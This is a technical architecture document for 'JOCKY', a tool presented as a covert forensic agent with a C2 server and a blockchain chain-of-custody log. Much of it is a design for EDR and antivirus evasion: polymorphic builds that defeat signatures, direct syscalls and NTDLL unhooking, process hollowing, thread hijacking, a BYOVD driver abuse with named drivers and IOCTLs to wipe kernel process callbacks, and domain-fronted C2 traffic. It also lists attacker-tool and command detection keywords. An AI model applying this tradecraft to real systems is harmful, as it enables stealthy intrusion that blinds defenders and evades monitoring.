# JOCKY — Technical Architecture

> Deep-dive reference for developers and NTRO technical reviewers.
> For the executive overview, see [README.md](README.md).

---

## System Architecture

```
┌──────────────────────────────────────────────────────────────────────┐
│                        INVESTIGATOR MACHINE                          │
│                                                                      │
│  ┌──────────────────┐     ┌─────────────────────────────────────┐   │
│  │   JOCKY CLI      │     │        C2 Server (FastAPI)          │   │
│  │   main.py        │     │        server/c2_server.py          │   │
│  │                  │     │                                     │   │
│  │  compile .jky    │     │  POST /api/evidence  ←── agents     │   │
│  │  run .jky        │     │  POST /api/checkin   ←── agents     │   │
│  │  verify chain    │     │  GET  /              → dashboard    │   │
│  └──────────────────┘     │  GET  /stream        → SSE feed     │   │
│                           │  GET  /coc/verify    → blockchain   │   │
│  ┌──────────────────┐     └──────────────┬────────────────────┘   │
│  │  Agent Controller│                    │                         │
│  │  (asyncio)       │     ┌──────────────▼────────────────────┐   │
│  │                  │     │      Forensic Blockchain           │   │
│  │  • multi-target  │     │      integrity/blockchain.py       │   │
│  │  • task dispatch │     │                                     │   │
│  │  • result collect│     │  Ed25519-signed blocks             │   │
│  └──────────────────┘     │  SHA-256 prev_hash linkage         │   │
│                           │  Court-admissible COC log          │   │
│  ┌──────────────────┐     └─────────────────────────────────────┘   │
│  │  Live Dashboard  │                                               │
│  │  127.0.0.1:8000  │                                               │
│  │                  │                                               │
│  │  Agent table     │                                               │
│  │  Evidence stream │                                               │
│  │  Blockchain view │                                               │
│  └──────────────────┘                                               │
└───────────────────────────────┬──────────────────────────────────────┘
                                │
              ┌─────────────────▼──────────────────┐
              │     Covert C2 Channel               │
              │                                     │
              │  TLS 1.3  (forced, no fallback)     │
              │  SNI:  cdnjs.cloudflare.com  ──┐    │
              │  Host: c2.example.com  ─────────┤    │
              │  Path: /drive/v3/files/{uuid}   │    │
              │  Body: AES-256-GCM ciphertext    │    │
              │                            CDN  │    │
              └────────────────────────────┬────┘    │
                                           │          
┌──────────────────────────────────────────▼─────────┐
│                    TARGET MACHINE                   │
│                                                     │
│  ┌─────────────────────────────────────────────┐   │
│  │            JOCKY Agent                      │   │
│  │            agent/main.py (or .exe service)  │   │
│  │                                             │   │
│  │  1. BYOVD → kernel EDR blind               │   │
│  │  2. 8 collectors → forensic bundle         │   │
│  │  3. AES-256-GCM encrypt (HKDF key)         │   │
│  │  4. POST to C2 → repeat every N seconds    │   │
│  └─────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────┘
```

---

## Phase-by-Phase Technical Detail

### Phases 1–3: JOCKY Language Frontend

The JOCKY language uses [Lark](https://github.com/lark-parser/lark) for grammar definition and parsing.

**Grammar** (`language/grammar/JOCKY.lark`):
```lark
start       : statement+
statement   : target_stmt | mode_stmt | task_stmt | condition_stmt
task_stmt   : TASK_KW identifier "(" arg_list? ")"
TASK_KW     : "collect" | "analyze" | "acquire" | "scan"
identifier  : NAME
```

**Pipeline**:
```
.jky source
    → Lark tokenizer (lexer.py) → token stream
    → Lark parser (parser.py)   → concrete syntax tree
    → ASTBuilder (ast_nodes.py) → typed AST
    → Validator (validator.py)  → semantic check (type safety, scope)
    → Interpreter (interpreter.py) → direct execution (fallback, no LLVM)
```

**Key AST nodes**: `ProgramNode`, `TaskNode`, `TargetNode`, `ModeNode`, `ConditionNode`, `IdentifierNode`, `ArgumentNode`

---

### Phases 4–5: LLVM IR Codegen + CFG Obfuscation

**IR Generation** (`language/llvm_frontend/ir_generator.py`):
- Uses `llvmlite` to emit LLVM IR from the AST
- Each JOCKY task maps to a function call in the IR
- Forensic primitives from `execution_engine/forensics/` are linked

**CFG Obfuscation** (`language/llvm_frontend/cf_obfuscator.py`):
- **Opaque predicates**: inserts always-true/always-false branch conditions that confuse decompilers
- **Junk blocks**: inserts dead basic blocks between real blocks
- **Block splitting**: splits large basic blocks at random cut points
- Result: control flow graph is visually complex, functionally identical

---

### Phase 6: Polymorphic Engine

Every build produces a **unique binary**. Three mutation passes:

| Pass | File | Technique |
|---|---|---|
| String encryption | `string_encryptor.py` | AES-256 encrypts string literals; decrypt stub added to binary |
| Variable scrambling | `var_renamer.py` | XOR scrambles global variable names using a per-build key |
| Import mutation | `var_renamer.py` | Randomises PE import table ordering via `pefile` |

Result: same source `.jky` → different SHA-256 binary every build. Static signature databases never match.

---

### Phases 7–8: Direct Syscalls + API Unhooking

**Problem**: EDR vendors hook NTDLL exports (`NtCreateProcess`, `NtWriteVirtualMemory`, etc.) to inspect arguments.

**Solution A — Direct syscalls** (`execution_engine/direct_syscalls/syscall_stubs.asm`):
```nasm
; Hand-written NASM stub — never touches NTDLL
NtAllocateVirtualMemory_stub:
    mov r10, rcx
    mov eax, <SSN>      ; System Service Number (resolved at runtime)
    syscall
    ret
```

SSN resolution in `syscall_gate.c` walks the Ldr module list to find ntoskrnl's export table and extracts syscall numbers at runtime — works even if NTDLL is patched.

**Solution B — NTDLL remap** (`execution_engine/ntdll_unhook/ntdll_unhook.c`):
- Maps a fresh copy of `ntdll.dll` from disk (not the in-memory hooked version)
- Overwrites the hooked bytes in the live NTDLL with clean bytes
- All subsequent NTDLL calls go through clean code

---

### Phases 9–11: Stealth Execution

| Phase | Component | Technique |
|---|---|---|
| 9 | `process_hollowing/hollow.c` | Spawn suspended process, unmap its image, map JOCKY agent, resume |
| 10 | `reflective_loader/reflective_loader.c` | DLL loads itself from memory without touching LoadLibrary |
| 11 | `thread_hijacker/hijack.c` | Suspend remote thread, hijack RIP to point at shellcode, resume |

Multi-vector: if one technique is detected, the next activates automatically.

---

### Phase 12: Forensic Primitives (C Layer)

Low-level collection implemented in C for maximum reliability and minimal userland API dependency:

| Module | API Used | What It Collects |
|---|---|---|
| `mem_acquire.c` | `NtQueryVirtualMemory`, `ReadProcessMemory` | Process VAD, heap contents, module list |
| `proc_analysis.c` | `NtQuerySystemInformation` (class 5) | Full process list, PEB, parent/child relationships |
| `net_state.c` | `GetExtendedTcpTable`, `GetExtendedUdpTable` | TCP/UDP table with owning PIDs |
| `fs_analysis.c` | `FindFirstFile` / NTFS MFT walk | File system artifacts, MFT timestamps |
| `reg_walk.c` | `RegOpenKeyEx`, `RegEnumKeyEx` | Registry hive enumeration |

---

### Phase 13: BYOVD — Kernel EDR Bypass

**Architecture**: Driver-agnostic vtable contract.

```
byovd_interface.h  ←  the contract (vtable only, no driver knowledge)
     │
     ├── backend_rtcore64.c    RTCore64.sys  IOCTL 0x80002048/0x8000204C
     ├── backend_winring0x64.c WinRing0x64   IOCTL 0x9C4060C4/0x9C40A0C8
     └── backend_asrdrv107.c   AsrDrv107     IOCTL 0x802AA058/0x802AA16E
```

**Vtable** (`byovd_ops_t`):
```c
typedef struct {
    byovd_result_t (*load)  (byovd_backend_t *self);   // SCM install + StartService
    byovd_result_t (*open)  (byovd_backend_t *self);   // CreateFile on device
    void           (*close) (byovd_backend_t *self);   // CloseHandle
    byovd_result_t (*unload)(byovd_backend_t *self);   // StopService + DeleteService
    byovd_result_t (*read)  (byovd_backend_t *self, uintptr_t addr, void *buf, size_t sz);
    byovd_result_t (*write) (byovd_backend_t *self, uintptr_t addr, const void *buf, size_t sz);
} byovd_ops_t;
```

**Callback scrubber** (`callback_scrubber.c`):
1. `EnumDeviceDrivers()` → ntoskrnl KVA (reliable, no struct offset guessing)
2. Map `ntoskrnl.exe` from disk → parse PE exports
3. Find `PsSetCreateProcessNotifyRoutine` → scan for `LEA rX, [RIP+disp32]` (14 patterns covering all GPRs with REX.W)
4. Decode RIP-relative displacement → `PspCreateProcessNotifyRoutine` KVA
5. Walk 64 `EX_FAST_REF` slots → decode `EX_CALLBACK_ROUTINE_BLOCK` → zero via `byovd_write64()`

```
PspCreateProcessNotifyRoutine[0..63]   ← EX_FAST_REF array in ntoskrnl .data
Each slot: pointer & ~0xF → EX_CALLBACK_ROUTINE_BLOCK
           +0x08: actual callback function pointer (e.g. WdFilter.sys, MsSense.sys)
After scrub: all slots = 0x0000000000000000
             EDR has no process-creation visibility
```

**Note on VBS/HVCI**: Physical-address drivers (WinRing0, AsrDrv107) are blocked by Hyper-V SLAT on dev machines with VBS active. RTCore64 (KVA-direct, no `MmMapIoSpace`) works on bare-metal Win11 24H2. The abstraction layer makes the switch trivial: one enum constant change.

---

### Phases 14–15: Covert Transport

**Domain Fronting** (`transport/domain_fronting.py`):

```
TCP connect → Cloudflare anycast IP (resolved from SNI domain)
TLS handshake: server_hostname = "cdnjs.cloudflare.com"   ← what DPI sees
HTTP request:  Host: c2.example.com                        ← what CDN routes to
               Content-Type: application/json
               Path: /drive/v3/files/{uuid}/content
```

The CDN terminates TLS using the SNI domain's certificate — a legitimate business. Deep packet inspection sees only that business's traffic.

**Wire Encryption** (`transport/cloud_api_wrapper.py`):

```
Key derivation:  HKDF-SHA256(PSK, agent_id) → 32-byte session key
Encryption:      AES-256-GCM(nonce=12B random, plaintext, AAD=agent_id)
Output:          nonce(12) + ciphertext(N) + tag(16) → base64
Wire format:     {"kind":"drive#file","content":"<base64>","id":"<uuid>","..."}
```

Message format inside encryption:
```
4B  magic      0x4A4F4B59 ('JOCKY')
4B  msg_type   0x01=checkin 0x02=cmd 0x03=result 0x04=heartbeat
4B  payload_len
NB  JSON payload
4B  sequence number (anti-replay)
```

**Circuit Breaker** (`transport/cdn_router.py`): CLOSED → OPEN (after 10 failures) → HALF-OPEN (after 300s). Prevents retry storms that would create detectable traffic signatures.

---

### Phase 16: Multi-Agent Controller

```python
# asyncio event loop in daemon thread — one loop, N agents
# each agent runs in its own coroutine
asyncio.ensure_future(_agent_poll_loop("agent-dc01"), loop=self._loop)
asyncio.ensure_future(_agent_poll_loop("agent-ws01"), loop=self._loop)

# poll cycle per agent:
# 1. run_in_executor(transport.checkin)   # blocking HTTP in thread pool
# 2. _dispatch_pending()                   # send next task from queue
# 3. asyncio.sleep(POLL_INTERVAL)
```

**Thread model**: All public API methods (`task()`, `broadcast()`, `results()`, `status()`) are called from the dashboard thread and protected by `threading.Lock()`. The asyncio loop runs in a separate daemon thread. Communication between threads uses `run_coroutine_threadsafe()`.

**Agent states**: `PENDING → CONNECTED → IDLE → TASKED → COLLECTING → LOST → TERMINATED`

---

### Phase 17: Dashboard + Blockchain

**FastAPI endpoints** (`management_interface/dashboard/api.py`):

```
GET  /                          → Live HTML dashboard
GET  /health                    → Controller status snapshot
GET  /agents                    → All agent statuses
POST /agents                    → Register new agent
POST /agents/{id}/tasks         → Dispatch forensic task
GET  /agents/{id}/results       → Collected evidence
POST /broadcast                 → Task to ALL agents
GET  /coc/summary               → Blockchain summary
GET  /coc/blocks                → All blockchain blocks
GET  /coc/verify                → Full chain integrity check
POST /coc/event                 → Manual blockchain entry
GET  /stream                    → SSE live event feed
POST /demo/seed                 → Populate with demo data
```

**Blockchain** (`integrity/blockchain.py`):

Each block:
```json
{
  "index": 4,
  "timestamp": "2026-09-25T18:31:05.123Z",
  "case_id": "NTRO-2025-001",
  "investigator": "INV-ALPHA",
  "event_type": "EVIDENCE_COLLECTED",
  "data": {"agent_id": "agent-dc01", "cmd_type": "proc_list", "bytes": 8432},
  "prev_hash": "c394e15a7f21...",
  "hash": "d402f16b8e32...",
  "signature": "a1b2c3d4..."
}
```

Block hash computation (deterministic):
```python
block_str = json.dumps({
    "index": ..., "timestamp": ..., "case_id": ...,
    "investigator": ..., "event_type": ...,
    "data": ..., "prev_hash": ..., "nonce": 0
}, sort_keys=True, separators=(",", ":"))
hash = sha256(block_str.encode()).hexdigest()
```

Signature: `Ed25519(investigator_private_key, bytes.fromhex(hash))`

**Verification** returns `(ok: bool, report: str)` — the report is a human-readable line-by-line audit suitable for court submission.

---

### Agent: Forensic Collectors

**`agent/collector.py`** — 8 collectors, pure stdlib + pywin32, zero additional deps:

```python
def collect_all(which=None) -> dict:
    collectors = {
        "proc_list":        _proc_list,
        "net_state":        _net_state,
        "reg_persistence":  _reg_persistence,
        "event_log":        _event_log,
        "usb_history":      _usb_history,
        "prefetch":         _prefetch,
        "browser_hist":     _browser_hist,
        "scheduled_tasks":  _scheduled_tasks,
    }
```

| Collector | Implementation | Threat Indicators Flagged |
|---|---|---|
| `proc_list` | `psutil` or `NtQuerySystemInformation` cl.5 | No disk image (hollow), suspicious paths, SHA-256 mismatch |
| `net_state` | `GetExtendedTcpTable` | External IPs, ephemeral ports → long-lived processes |
| `reg_persistence` | `winreg` walk of all Run/RunOnce/Service keys | `powershell`, `mshta`, `certutil`, `base64`, `wscript` in values |
| `event_log` | `win32evtlog` reading Security+System | Event IDs: 4624(logon), 4688(process), 4698/4702(sched task), 7045(service) |
| `usb_history` | `HKLM\SYSTEM\...\USBSTOR` | All time-stamped USB device connections |
| `prefetch` | Binary parse of `C:\Windows\Prefetch\*.pf` | `MIMIKATZ`, `PSEXEC`, `WCE`, `FGDUMP`, `PROCDUMP` |
| `browser_hist` | SQLite query on Chrome/Edge `History` DB | Downloads, visited URLs, search terms |
| `scheduled_tasks` | `schtasks /query /fo CSV /v` + XML parse | SYSTEM-privilege tasks with `cmd.exe`, `powershell.exe`, `wscript.exe` |

**Wire format** from agent to C2:
```json
{
  "agent_id": "jocky-a1b2c3d4",
  "seq": 3,
  "data": "<base64(AES-256-GCM(JOCKY_wire_message))>",
  "plain_summary": {
    "hostname": "WORKSTATION-FINANCE",
    "collectors": ["proc_list", "net_state", "..."],
    "proc_count": 87,
    "net_count": 12,
    "suspicious": 2
  }
}
```

---

### Server: C2 Receiver

**`server/c2_server.py`** handles:

1. `POST /api/checkin` — agent announces itself → `AGENT_DEPLOYED` block added
2. `POST /api/evidence` — decrypt AES-256-GCM bundle → parse collectors → `EVIDENCE_COLLECTED` block → SSE push → save JSON
3. `GET /` — serve live dashboard HTML
4. `GET /stream` — SSE endpoint (persistent connection, push events to browser)
5. All blockchain endpoints proxied from `integrity/blockchain.py`

Evidence saved to: `evidence/evidence_{agent_id}_{seq:06d}.json`

---

## Security Model

### What JOCKY Protects Against

| Threat | Mitigation |
|---|---|
| AV static signature | Polymorphic engine — unique binary per build |
| EDR behavioral hooks | API unhooking + direct syscalls bypass NTDLL hooks |
| EDR process callbacks | BYOVD zeroes `PspCreateProcessNotifyRoutine` |
| Network DPI | Domain fronting — traffic appears as CDN |
| Traffic timing analysis | Jitter (±30%) on all C2 intervals |
| Circuit fingerprint | User-Agent mimics real browser; paths mimic Drive API |
| Evidence tampering | SHA-256 chain + Ed25519 signatures on blockchain |
| Key compromise | Per-agent HKDF derivation — one key leak ≠ all agents |
| Replay attacks | Sequence counter in every encrypted message |

### What JOCKY Does NOT Protect Against

- Physical inspection of the target machine while the agent is running
- Memory forensics of the investigator's machine (PSK in memory)
- An attacker who has already compromised the C2 server
- HVCI/VBS enabled targets — BYOVD cannot load unsigned or blocklisted drivers

---

## Cryptographic Primitives Summary

| Purpose | Algorithm | Key Size | Library |
|---|---|---|---|
| Evidence encryption | AES-256-GCM | 256-bit | `cryptography` (AESGCM) |
| Key derivation | HKDF-SHA256 | 256-bit | `hmac` + `hashlib` (stdlib) |
| Block signing | Ed25519 | 256-bit | `cryptography` (hazmat) |
| Block hashing | SHA-256 | 256-bit | `hashlib` (stdlib) |
| Agent ID derivation | SHA-256 | 256-bit | `hashlib` (stdlib) |
| File ID derivation | SHA-256 (truncated) | — | `hashlib` (stdlib) |

---

## Build Instructions

### Agent (target-side binary)

```powershell
cd D:\path\to\JOCKY
.\build_agent.bat
# Output: dist\jocky_agent.exe  (~15MB standalone, no Python required)
```

### BYOVD Engine (kernel component)

```powershell
cd byovd\kernel_subverter
.\build.bat          # clang
# or
.\build.bat msvc     # MSVC
# Output: jocky_byovd.exe
```

### Full Pipeline Test

```powershell
# Phase 14 unit tests
python -m transport.test_phase14

# Phase 16 smoke test
python management_interface/agent_controller.py

# Phase 17 end-to-end
python server/c2_server.py &
python agent/main.py --c2 http://127.0.0.1:8000 --once
Invoke-RestMethod http://127.0.0.1:8000/coc/verify
```
